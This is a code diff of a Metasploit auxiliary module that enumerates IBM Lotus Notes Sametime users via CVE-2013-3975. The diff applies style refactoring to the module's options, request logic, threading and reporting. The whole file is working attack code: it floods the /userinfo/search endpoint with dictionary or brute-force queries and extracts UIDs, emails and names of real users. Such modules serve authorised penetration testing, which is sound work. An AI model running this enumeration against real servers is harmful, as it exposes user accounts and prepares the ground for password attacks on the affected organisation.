@@ -1,60 +1,60 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'enumerable'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',
-      'Description'    => %q{
-        This module extracts usernames using the IBM Lotus Notes Sametime web
-        interface using either a dictionary attack (which is preferred), or a
-        bruteforce attack trying all usernames of MAXDEPTH length or less.
-      },
-      'Author'         =>
-        [
-          'kicks4kittens' # Metasploit module
-        ],
-      'References' =>
-        [
-          [ 'CVE', '2013-3975' ],
-          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
-        ],
-      'DefaultOptions' =>
-        {
-          'SSL' => true
-        },
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Dec 27 2013'
-    ))
+                      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',
+                      'Description'    => %q{
+                        This module extracts usernames using the IBM Lotus Notes Sametime web
+                        interface using either a dictionary attack (which is preferred), or a
+                        bruteforce attack trying all usernames of MAXDEPTH length or less.
+                      },
+                      'Author' =>
+                        [
+                          'kicks4kittens' # Metasploit module
+                        ],
+                      'References' =>
+                        [
+                          [ 'CVE', '2013-3975' ],
+                          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']
+                        ],
+                      'DefaultOptions' =>
+                        {
+                          'SSL' => true
+                        },
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => 'Dec 27 2013'))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('TARGETURI', [ true, 'The path to the userinfo script', '/userinfo/search']),
-         OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),
+        OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),
         OptEnum.new('TYPE', [true, 'Specify UID or EMAIL', 'UID', ['UID', 'EMAIL'] ]),
-        OptPath.new('DICT', [ false,  'Path to dictionary file to use', '']),
-        OptInt.new('MAXDEPTH', [ true,  'Maximum depth to check during bruteforce', 2])
-      ], self.class)
+        OptPath.new('DICT', [ false, 'Path to dictionary file to use', '']),
+        OptInt.new('MAXDEPTH', [ true, 'Maximum depth to check during bruteforce', 2])
+      ], self.class
+    )
 
     register_advanced_options(
       [
         OptString.new('SpecialChars', [false, 'Specify special chars (e.g. -_+!@&$/\?)', '' ]),
         OptString.new('PREFIX', [ false,  'Defines set prefix for each guess (e.g. user)', '']),
         OptString.new('SUFFIX', [ false,  'Defines set post for each quess (e.g. _adm)', '']),
-        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
-        OptInt.new('Threads', [ true,  'Number of test threads', 10])
-      ], self.class)
+        OptInt.new('TIMING', [ true, 'Set pause between requests', 0]),
+        OptInt.new('Threads', [ true, 'Number of test threads', 10])
+      ], self.class
+    )
   end
 
   def setup
@@ -75,18 +75,16 @@ class MetasploitModule < Msf::Auxiliary
         ("0".."9").each { |num| @charset.push(num) }
       end
 
-      if datastore['SpecialChars']
-        datastore['SpecialChars'].chars do | spec |
-          @charset.push(Rex::Text.uri_encode(spec))
-        end
+      datastore['SpecialChars']&.chars do |spec|
+        @charset.push(Rex::Text.uri_encode(spec))
       end
       print_status("Performing Bruteforce attack")
-      vprint_status("Using CHARSET: [#{@charset.join(",")}]")
+      vprint_status("Using CHARSET: [#{@charset.join(',')}]")
     else
       print_status("Performing dictionary based attack (#{datastore['DICT']})")
     end
 
-    if datastore['DICT'].blank? and datastore['MAXDEPTH'] > 2
+    if datastore['DICT'].blank? && datastore['MAXDEPTH'] > 2
       # warn user on long runs
       print_status("Depth level #{datastore['MAXDEPTH']} selected... this may take some time!")
     end
@@ -108,21 +106,19 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Testing for IBM Lotus Notes Sametime User Enumeration flaw")
 
     # test for expected response code on non-existant uid/email
-    if datastore['TYPE'] == "UID"
-      random_val = Rex::Text.rand_text_alpha(32)
-    else
-      random_val = Rex::Text.rand_text_alpha(32) +"@"+ Rex::Text.rand_text_alpha(16) + ".com"
-    end
+    random_val = if datastore['TYPE'] == "UID"
+                   Rex::Text.rand_text_alpha(32)
+                 else
+                   Rex::Text.rand_text_alpha(32) + "@" + Rex::Text.rand_text_alpha(16) + ".com"
+                 end
 
-    res = send_request_cgi({
-      'uri'     =>  normalize_uri(target_uri.path),
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
-      'vars_get' => {
-        'mode' => datastore['TYPE'].downcase,
-        'searchText' => random_val
-      }
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path),
+                           'method'  => 'GET',
+                           'ctype'   => 'text/html',
+                           'vars_get' => {
+                             'mode' => datastore['TYPE'].downcase,
+                             'searchText' => random_val
+                           })
 
     begin
       if res.nil?
@@ -136,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Response received, continuing to enumeration phase")
       end
     rescue JSON::ParserError,
-      print_error("Error parsing JSON: Invalid response from server")
+           print_error("Error parsing JSON: Invalid response from server")
       return
     end
 
@@ -163,11 +159,11 @@ class MetasploitModule < Msf::Auxiliary
 
       begin
         1.upto(nt) do
-          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
-            Thread.current.kill if not test_current
+          t << framework.threads.spawn("Module(#{refname})-#{rhost}", false, @test_queue.shift) do |test_current|
+            Thread.current.kill unless test_current
 
             # provide feedback to user on current test length
-            if datastore['DICT'].blank? and test_current.length > test_length
+            if datastore['DICT'].blank? && test_current.length > test_length
               test_length = test_current.length
               print_status("Beginning bruteforce test for #{test_length} character strings")
             end
@@ -175,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
             res = make_request(test_current)
 
             # check response to see if an error was returned, if so wait 1 second and retry
-            if res.nil? and not @retries.include?(test_current)
+            if res.nil? && !@retries.include?(test_current)
               # attempt test again as the server was too busy to respond
               # correctly - error returned
               print_error("Error reading JSON response, attempting to redo check for \"#{test_current}\"")
@@ -190,11 +186,17 @@ class MetasploitModule < Msf::Auxiliary
             end
           end
         end
-      t.each {|x| x.join }
+        t.each(&:join)
 
       rescue ::Timeout::Error
       ensure
-        t.each {|x| x.kill rescue nil }
+        t.each do |x|
+          begin
+                      x.kill
+                    rescue
+                      nil
+                    end
+        end
       end
     end
   end
@@ -204,30 +206,26 @@ class MetasploitModule < Msf::Auxiliary
     # combine test string with PRE and POST variables
     tstring = datastore['PREFIX'] + test_current + datastore['SUFFIX'] + "*"
     # Apply timing information to pause between making requests - not a timeout
-    if datastore['TIMING'] > 0
-      Rex::sleep(datastore['TIMING'])
-    end
+    Rex.sleep(datastore['TIMING']) if datastore['TIMING'] > 0
 
-    res = send_request_cgi({
-      'uri'     =>  normalize_uri(target_uri.path),
-      'method'  => 'GET',
-      'ctype'   => 'text/html',
-      'vars_get' => {
-        'mode' => datastore['TYPE'].downcase,
-        'searchText' => tstring
-      }
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path),
+                           'method'  => 'GET',
+                           'ctype'   => 'text/html',
+                           'vars_get' => {
+                             'mode' => datastore['TYPE'].downcase,
+                             'searchText' => tstring
+                           })
   end
 
   # check the response for valid user information
   def check_response(res, test_current)
     begin
       # check response exists AND that it validates as JSON before proceeding
-      if res.code.to_i == 200 and not JSON.parse(res.body).blank?
+      if (res.code.to_i == 200) && !JSON.parse(res.body).blank?
         # successful response - extract user data
         extract_user(res)
         # extend test_queue to search for further data (not if dictionary in use)
-        extend_queue(test_current) if (datastore['DICT'].blank?)
+        extend_queue(test_current) if datastore['DICT'].blank?
       end
     rescue JSON::ParserError
       # non-JSON response - server may be overloaded
@@ -259,10 +257,10 @@ class MetasploitModule < Msf::Auxiliary
   # To find all users the queue must be extended by adding 'aa' through to 'az'
   def extend_queue(test_current)
     if test_current.length < datastore['MAXDEPTH']
-      @charset.each do | char |
+      @charset.each do |char|
         @test_queue.push(test_current + char)
       end
-    elsif @depth_warning and test_current.length == datastore['MAXDEPTH'] and datastore['MAXDEPTH'] > 1
+    elsif @depth_warning && (test_current.length == datastore['MAXDEPTH']) && datastore['MAXDEPTH'] > 1
       vprint_status("Depth limit reached [#{datastore['MAXDEPTH']} levels deep] finishing up current tests")
       @depth_warning = false
     end
@@ -270,13 +268,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_user(username)
     report_note(
-      :host   => rhost,
-      :port   => rport,
-      :proto  => 'tcp',
-      :sname  => 'sametime',
-      :type   => 'ibm_lotus_sametime_user',
-      :data   => "#{username}",
-      :update => :unique_data
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: 'sametime',
+      type: 'ibm_lotus_sametime_user',
+      data: username.to_s,
+      update: :unique_data
     )
   end
 
@@ -288,24 +286,24 @@ class MetasploitModule < Msf::Auxiliary
       'Header'  => "IBM Lotus Sametime Users",
       'Prefix'  => "\n",
       'Indent'  => 1,
-      'Columns'   =>
+      'Columns' =>
       [
         "UID",
         "Email",
         "CommonName"
-      ])
+      ]
+    )
 
     # populate tables
-    @user_data.each do | line |
+    @user_data.each do |line|
       user_tbl << [ line[0], line[1], line[2] ]
     end
 
-    if not user_tbl.to_s.empty?
+    if !user_tbl.to_s.empty?
       print_good("#{@user_data.length} users extracted")
       print_line(user_tbl.to_s)
     else
       print_error("No users discovered")
     end
   end
-
 end
